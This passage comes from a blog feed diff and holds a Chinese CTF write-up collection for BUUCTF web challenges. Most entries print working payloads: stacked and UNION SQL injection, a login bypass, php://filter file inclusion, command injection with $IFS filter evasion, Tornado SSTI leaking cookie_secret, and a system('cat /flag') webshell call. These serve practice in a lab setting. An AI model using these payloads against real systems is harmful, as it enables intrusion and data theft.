&quot;NO&quot;</span><br><span class="line">  [3]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]&#x3D;&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;show columns from &#96;1919810931114514&#96;;#</span><br></pre></td></tr></table></figure>
+<p>注意：在windows系统下，反单引号（`）是数据库、表、索引、列和别名用的引用符</p>
+<p>eg.  mysql&gt; SELECT * FROM   <code>table</code>   WHERE  <code>id</code> = ‘123’ ;</p>
+<p>1919810931114514必须用反单引号括起来，但是words不需要，我也不知道为什么,向大佬求解</p>
+<p>这个表中发现字段flag</p>
+<p><img src="https://img-blog.csdnimg.cn/20210114142029194.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>之前不是通过 order by查询是有两个字段吗 ,可以猜测到现在sql语句查询的是word这个表里面的数据</p>
+<p>接下来就是用各种膜拜大佬们的wp,下面这个是很骚的解法</p>
+<h3 id="解法一-改名"><a class="header-anchor" href="#解法一-改名">¶</a>解法一:改名</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">因为可以堆叠查询，这时候就想到了一个改名的方法，把words随便改成words1，然后把1919810931114514改成words，再把列名flag改成id，结合上面的1&#39; or 1&#x3D;1#爆出表所有内容就可以查flag啦</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">修改表名:RENAME TABLE &lt;旧表名&gt; TO &lt;新表名&gt;;</span><br><span class="line">修改字段名:alter table &lt;表名&gt; change &lt;字段名&gt; &lt;字段新名称&gt; &lt;字段的类型&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>payload:</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;rename table &#96;words&#96; to &#96;words1&#96;;rename table &#96;1919810931114514&#96; to &#96;words&#96;;alter table &#96;words&#96; change &#96;flag&#96; &#96;id&#96; VARCHAR(50);#</span><br></pre></td></tr></table></figure>
+<p>然后 <code>1' or 1=1 #</code> 爆出flag</p>
+<h3 id="解法二-预处理语句-堆叠注入"><a class="header-anchor" href="#解法二-预处理语句-堆叠注入">¶</a>解法二:预处理语句+堆叠注入</h3>
+<p>先了解预处理语句</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PREPARE：准备一条SQL语句，并分配给这条SQL语句一个名字供之后调用</span><br><span class="line">EXECUTE ：执行命令</span><br><span class="line">DEALLOCATE PREPARE：释放命令</span><br></pre></td></tr></table></figure>
+<p>测试</p>
+<p><img src="https://img-blog.csdnimg.cn/20210114142049172.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;set @sql&#x3D;concat(&#39;s&#39;,&#39;elect &#96;flag&#96; from &#96;1919810931114514&#96;&#39;);PREPARE stmt1 FROM @sql;EXECUTE stmt1;#</span><br></pre></td></tr></table></figure>
+<p>或者</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;SET @sqli&#x3D;concat(char(115,101,108,101,99,116),&#39;* from &#96;1919810931114514&#96;&#39;);PREPARE hacker from @sqli;EXECUTE hacker;#</span><br></pre></td></tr></table></figure>
+<p>参考:<a href="https://www.jianshu.com/p/6c6a44517dd7">https://www.jianshu.com/p/6c6a44517dd7</a></p>
+<h2 id="极客大挑战-2019-EasySQL"><a class="header-anchor" href="#极客大挑战-2019-EasySQL">¶</a>[极客大挑战] 2019 EasySQL</h2>
+<p>测试得到是单引号闭合</p>
+<p>万能密码就能爆出flag</p>
+<p><strong>payload:</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uername:-1</span><br><span class="line">password: 1&#39;or 1 &#x3D;1%23</span><br></pre></td></tr></table></figure>
+<h2 id="极客大挑战-2019-Havefun"><a class="header-anchor" href="#极客大挑战-2019-Havefun">¶</a>[极客大挑战]2019 Havefun</h2>
+<p>查看源码,发现代码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$cat&#x3D;$_GET[&#39;cat&#39;];</span><br><span class="line">echo $cat;</span><br><span class="line">if($cat&#x3D;&#x3D;&#39;dog&#39;)&#123;</span><br><span class="line">echo &#39;Syc&#123;cat_cat_cat_cat&#125;&#39;;&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+<p>原来感觉是命令执行…随便穿了一个dog就出flag了。。。。</p>
+<h2 id="SUCTF-2019-EasySQL"><a class="header-anchor" href="#SUCTF-2019-EasySQL">¶</a>[SUCTF 2019]EasySQL</h2>
+<p>尝试看看 查询当前数据库名</p>
+<p><img src="https://ae01.alicdn.com/kf/U85c1a3fe2bba44bd97aa4c685f4285d5R.jpg" alt=""></p>
+<p>测试可以发现我们输入数据的位置应该在  select x,x,x from aaaaaa 的 x 位置</p>
+<p>输入 *,1 尝试 直接读出来了。。。。。估计是非预期</p>
+<p>接着我尝试堆叠注入  <code>1;show tables;</code> 发现flag这个表,再去读的时候发现过滤了 from。。。不会了 看看大佬的wp吧</p>
+<p>内置的sql语句为<code>sql =&quot;select&quot;.post[‘query’].&quot;||flag from Flag&quot;;</code></p>
+<p>payload:</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>;<span class="keyword">set</span> sql_mode<span class="operator">=</span>PIPES_AS_CONCAT;<span class="keyword">select</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>补充系统变量@@sql_modesql_mode：是一组mysql支持的基本语法及校验规则<br>
+PIPES_AS_CONCAT：将“||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似</p>
+<p>将sql_mode设置为PIPES_AS_CONCAT的话，||就不再是逻辑or了，而变成了字符串连接符。<br>
+因此设置之后<code>select 1||flag from Flag</code>就变成了将<code>select 1 from Flag</code>和<code>select flag from Flag</code>的结果拼接到一起了。而且使用字母连接会报错，使用数字连接才会查询出数据。</p>
+<p>本地测试一下:</p>
+<p><img src="https://ae01.alicdn.com/kf/U265bf89c1aa54e8bb93494551df95390F.jpg" alt=""></p>
+<h2 id="ACTF2020-新生赛-Include"><a class="header-anchor" href="#ACTF2020-新生赛-Include">¶</a>[ACTF2020]新生赛 Include</h2>
+<p>打开题目 tips</p>
+<p>发现地址栏有个file参数 明显的文件包含</p>
+<p>尝试读取  …/…/…/…/…/etc/passwd  ,可以成功</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
+<h2 id="极客大挑战-2019-Secret-File"><a class="header-anchor" href="#极客大挑战-2019-Secret-File">¶</a>[极客大挑战]2019 Secret File</h2>
+<p>打开题目右键查看源码</p>
+<p>发现 Archi ve_room.php</p>
+<p>然后 点进去源码又发现action.php</p>
+<p>然后会重定向到 end.php</p>
+<p>bp抓包 发现 secr3t.php  发现源码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    $file&#x3D;$_GET[&#39;file&#39;];</span><br><span class="line">    if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">        echo &quot;Oh no!&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    include($file); </span><br><span class="line">&#x2F;&#x2F;flag放在了flag.php里</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+<p>伪协议读取得到flag</p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
+<h2 id="极客大挑战-2019-LoveSQL"><a class="header-anchor" href="#极客大挑战-2019-LoveSQL">¶</a>[极客大挑战]2019 LoveSQL</h2>
+<p>打开题目 order by发现字段为3</p>
+<p>查表: 有两个</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;d&amp;password&#x3D;1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()%23</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210114165135624.png" alt="在这里插入图片描述"></p>
+<p>查表 l0ve1ysq1 的列名</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;d&amp;password&#x3D;1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;l0ve1ysq1&#39;%23</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210114165050773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>查数据得到flag  但是我竟然蠢到用 limit 读取。。。。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;admin&amp;password&#x3D;1&#39; union select 2,2,password from &#96;l0ve1ysq1&#96; limit 15,1%23</span><br></pre></td></tr></table></figure>
+<p>可以用 group_concat</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;admin&amp;password&#x3D;1&#39; union select 2,2,group_concat(password) from &#96;l0ve1ysq1&#96;%23</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">group_concat()函数</span><br><span class="line">1、功能：将group by产生的同一个分组中的值连接起来，返回一个字符串结果。</span><br><span class="line">2、语法：group_concat( [distinct] 要连接的字段 [order by 排序字段 asc&#x2F;desc  ] [separator &#39;分隔符&#39;] )</span><br><span class="line">说明：通过使用distinct可以排除重复值；如果希望对结果中的值进行排序，可以使用order by子句；separator是一个字符串值，缺省为一个逗号。</span><br></pre></td></tr></table></figure>
+<h2 id="GXYCTF2019-Ping-Ping-Ping"><a class="header-anchor" href="#GXYCTF2019-Ping-Ping-Ping">¶</a>[GXYCTF2019]Ping Ping Ping</h2>
+<p>打开题目发现是rce</p>
+<p>尝试读取:  没有过滤分号</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1;ls</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210114234736150.png" alt="在这里插入图片描述"></p>
+<p>直接cat flag.php 不行 估计是flag被过滤了使用变量拼接  发现空格被过滤 使用 $IFS$9 绕过</p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$9fla$a.php</span><br></pre></td></tr></table></figure>
+<h2 id="ACTF2020-新生赛-Exec"><a class="header-anchor" href="#ACTF2020-新生赛-Exec">¶</a>[ACTF2020 新生赛]Exec</h2>
+<p>发现没过滤空格也没过滤分号 直接查看根目录发先flag</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1;ls &#x2F;;</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210117113243979.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1;cat &#x2F;f*;</span><br></pre></td></tr></table></figure>
+<h2 id="护网杯-2018-easy-tornado"><a class="header-anchor" href="#护网杯-2018-easy-tornado">¶</a>[护网杯 2018]easy_tornado</h2>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Orz.txt 进去提示是 render()</span><br><span class="line">hint.txt 进去提示是 md5(cookie_secret + md5(filename))</span><br><span class="line">flag.txt 进去提示是 &#x2F;fllllllllllag</span><br></pre></td></tr></table></figure>
+<p>注意查看 url的格式</p>
+<p><code>http://f3935217-6a95-491e-835b-2d172cfd9138.node3.buuoj.cn/file?filename=/flag.txt&amp;filehash=980fa5e6f1ece480d174ae0354c9655b</code></p>
+<p>查了一下 tornado这个框架</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Tornado是一种 Web 服务器软件的开源版本。Tornado 和主流Web 服务器框架（包括大多数 Python 的框架）有着明显的区别：它是非阻塞式服务器，而且速度相当快。</span><br><span class="line">得利于其非阻塞的方式和对epoll的运用，Tornado 每秒可以处理数以千计的连接，因此 Tornado 是实时 Web 服务的一个 理想框架。</span><br></pre></td></tr></table></figure>
+<p>输入了不存在的地址 发现有报错</p>
+<p>感觉是报错模板注入了</p>
+<p>不知道要怎么读到  cookie_secret 这个变量</p>
+<p><a href="https://www.freebuf.com/vuls/83999.html">服务端模板注入攻击 （SSTI）之浅析</a></p>
+<p><code>/error?msg=&#123;&#123;1&#125;&#125;</code> 确实可以执行，确定是SSTI，这个 <code>( ) [ ] _</code> 全给过滤了，看来只能想别的办法了。。</p>
+<p>通过膜拜大佬博客发现cookie_secret在Application对象settings属性中，还发现self.application.settings有一个<a href="https://tornado.readthedocs.io/en/latest/web.html#tornado.web.RequestHandler.settings">别名</a></p>
+<p>handler指向的处理当前这个页面的RequestHandler对象，<br>
+RequestHandler.settings指向self.application.settings，<br>
+因此handler.settings指向RequestHandler.application.settings。</p>
+<p>构造payload获取cookie_secret</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;error?msg&#x3D;&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>然后根据<code>md5(cookie_secret+md5(filename))</code>，得到/fllllllllllllag访问的哈希，最后拿到flag</p>
+<h2 id="极客大挑战-2019-Knife"><a class="header-anchor" href="#极客大挑战-2019-Knife">¶</a>[极客大挑战 2019]Knife</h2>
+<p>打开题目 发现页面给了一句话</p>
+<p><img src="https://img-blog.csdnimg.cn/20210117231903596.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Syc&#x3D;system(&#39;cat &#x2F;flag&#39;);</span><br></pre></td></tr></table></figure>
+<h2 id="RoarCTF-2019-Easy-Calc"><a class="header-anchor" href="#RoarCTF-2019-Easy-Calc">¶</a>[RoarCTF 2019]Easy Calc</h2>
+<p>打开题目 查看源代码</p>
+<p>发现有calc.php 打开发现waf</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!isset($_GET[&#39;num&#39;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">        $str &#x3D; $_GET[&#39;num&#39;];</span><br><span class="line">        $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;,&#39;\$&#39;,&#39;\\&#39;,&#39;\^&#39;];</span><br><span class="line">        foreach ($blacklist as $blackitem) &#123;</span><br><span class="line">                if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $str)) &#123;</span><br><span class="line">                        die(&quot;what are you want to do?&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        eval(&#39;echo &#39;.$str.&#39;;&#39;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="解题步骤"><a class="header-anchor" href="#解题步骤">¶</a>解题步骤</h3>
+<p>先列出根目录文件 发现flag</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">? num&#x3D;print_r(scandir(&#39;&#x2F;&#39;)); 这里由于单引号被过滤了，那就用chr()绕过，chr(47)就是斜杠&#x2F;  </span><br><span class="line">? num&#x3D;print_r(scandir(chr(47)));</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210117235033293.png" alt="在这里插入图片描述"></p>
+<p>读取flag</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">? num&#x3D;print_r(file_get_contents(&#39;&#x2F;flagg&#39;));</span><br><span class="line">这里&#x2F;&#x3D;chr(47),f&#x3D;chr(102),l&#x3D;chr(49),a&#x3D;chr(97),g&#x3D;chr(103),g&#x3D;chr(103)来进行绕过</span><br><span class="line">? num&#x3D;print_r(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)));</span><br></pre></td></tr></table></figure>
+<h3 id="解析"><a class="header-anchor" href="#解析">¶</a>解析</h3>
+<p>假如waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</p>
+<p>PHP的字符串解析特性:</p>
+<p>PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.删除空白符</span><br><span class="line">2.将某些字符转换为下划线（包括空格）</span><br></pre></td></tr></table></figure>
+<p>【当waf不让你过的时候，php却可以让你过】</p>
+<p><strong>还有一种方法 HTTP请求走私 我太菜了 还没学会 后面再补吧</strong></p>
+<p>可参考:<a href="https://www.cnblogs.com/chrysanthemum/p/11757363.html">https://www.cnblogs.com/chrysanthemum/p/11757363.html</a></p>
+<h2 id="极客大挑战-2019-Http"><a class="header-anchor" href="#极客大挑战-2019-Http">¶</a>[极客大挑战 2019]Http</h2>
+<p>这题早有耳闻  入门的时候做过 考点肯定就是利用bp改包伪造请求</p>
+<p>右键源代码 发现提示</p>
+<p><img src="https://img-blog.csdnimg.cn/20210118000755505.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>打开提示</p>
+<p><img src="https://img-blog.csdnimg.cn/2021011800082519.png" alt="在这里插入图片描述"></p>
+<p>说明要改</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Referer: https:&#x2F;&#x2F;www.Sycsecret.com</span><br></pre></td></tr></table></figure>
+<p>又提示</p>
+<p><img src="C:%5CUsers%5Cwh1tecell%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210118001145173.png" alt="image-20210118001145173"></p>
+<p>再改</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User-Agent: &quot;Syclover&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210118001403888.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>再改</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></figure>
+<p>得到flag</p>
+<p>放一张最终的图</p>
+<p><img src="https://img-blog.csdnimg.cn/20210118001454919.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="极客大挑战-2019-PHP"><a class="header-anchor" href="#极客大挑战-2019-PHP">¶</a>[极客大挑战 2019]PHP</h2>
+<p>打开题目开到这个  忍不住扫呀</p>
+<p><img src="https://img-blog.csdnimg.cn/20210118001741107.png" alt="在这里插入图片描述"></p>
+<p>试了 www.zip 还真对了。。。 不愧是我。。。</p>
+<p>打开class.php一看源码</p>
+<p>反序列没错了</p>
+]]></content>
+      <categories>
+        <category>刷题站</category>
+        <category>buuctf</category>
       </categories>
   </entry>
   <entry>
